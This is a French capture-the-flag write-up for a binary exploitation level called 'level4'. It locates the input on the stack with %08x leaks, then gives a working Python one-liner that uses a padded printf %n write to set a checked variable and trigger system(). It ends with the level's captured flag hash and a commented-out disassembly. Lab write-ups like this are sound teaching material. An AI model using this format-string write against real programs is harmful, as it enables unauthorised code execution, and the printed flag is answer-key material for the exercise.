## Démarches

- Comme au level précédent, il est possible d'afficher la mémoire avec l'appel non formaté de printf :
  - Pour trouver où se fait l'écriture des paramètres, on lance `./level4`, puis sur l'entrée standard :
    `AAA0_%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x`
    > AAA0_b7ff26b0.bffff754.b7fd0ff4.00000000.00000000.bffff718.0804848d.bffff510.00000200.b7fd1ac0.b7ff37d0.30414141
    Le 12ème octet affiche `30414141` soit notre chaîne `AAA0` (inversée car little endian)
  
  - Avant l'appel système, une comparaison est faite avec la variable à l'adresse `0x8049810` qui contient *0x1025544* soit *16930116* en décimal
  - Le fgets est limité à 512 caractères, on utilise donc l'option **padding** de printf pour écrire suffisamment de caractères pour obtenir la bonne valeur, et on exploite les caratèristiques du formateur **%x** puisqu'il affiche la valeur qu'il cible sur la pile.
  - `(python -c 'print("\x10\x98\x04\x08"+"%16930112x"+"%12$n")') | ./level4`
    > 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
<br>
----



<!-- - `objdump -d level4`
  ```
    080484a7 <main>:
    80484a7:	55                   	push   %ebp
    80484a8:	89 e5                	mov    %esp,%ebp
    80484aa:	83 e4 f0             	and    $0xfffffff0,%esp
    80484ad:	e8 a5 ff ff ff       	call   8048457 <n>
    80484b2:	c9                   	leave
    80484b3:	c3                   	ret

    08048457 <n>:
    8048457:	55                   	push   %ebp
    8048458:	89 e5                	mov    %esp,%ebp
    804845a:	81 ec 18 02 00 00    	sub    $0x218,%esp
    8048460:	a1 04 98 04 08       	mov    0x8049804,%eax
    8048465:	89 44 24 08          	mov    %eax,0x8(%esp)
    8048469:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)
    8048470:	00
    8048471:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
    8048477:	89 04 24             	mov    %eax,(%esp)
    804847a:	e8 d1 fe ff ff       	call   8048350 <fgets@plt>
    804847f:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
    8048485:	89 04 24             	mov    %eax,(%esp)
    8048488:	e8 b7 ff ff ff       	call   8048444 <p>
    804848d:	a1 10 98 04 08       	mov    0x8049810,%eax
    8048492:	3d 44 55 02 01       	cmp    $0x1025544,%eax
    8048497:	75 0c                	jne    80484a5 <n+0x4e>
    8048499:	c7 04 24 90 85 04 08 	movl   $0x8048590,(%esp)
    80484a0:	e8 bb fe ff ff       	call   8048360 <system@plt>
    80484a5:	c9                   	leave
    80484a6:	c3                   	ret

    08048444 <p>:
    8048444:	55                   	push   %ebp
    8048445:	89 e5                	mov    %esp,%ebp
    8048447:	83 ec 18             	sub    $0x18,%esp
    804844a:	8b 45 08             	mov    0x8(%ebp),%eax
    804844d:	89 04 24             	mov    %eax,(%esp)
    8048450:	e8 eb fe ff ff       	call   8048340 <printf@plt>
    8048455:	c9                   	leave
    8048456:	c3                   	ret
  ``` -->
